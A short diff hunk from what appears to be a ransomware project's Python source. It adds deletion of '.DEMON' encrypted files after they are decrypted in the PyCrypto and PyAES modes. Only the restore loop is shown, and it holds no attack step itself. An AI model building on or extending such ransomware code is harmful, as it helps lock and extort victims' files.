@@ -1079,11 +1079,13 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                     if name.endswith(".DEMON"):
                         if ask == 'PyCrypto':
                             decrypt_file(os.path.join(path, name), key)
+                            os.remove(os.path.join(path, name))
                             print("[Decrypted] %s" % name)
                             counter+=1
                         elif ask == 'PyAES':
                             print("[Decrypting] %s" % name)
                             decrypt_file_pyaes(os.path.join(path, name), key)
+                            os.remove(os.path.join(path, name))
                             counter+=1
                         elif ask == 'Ghost':
                             rename_file(os.path.join(path, name))
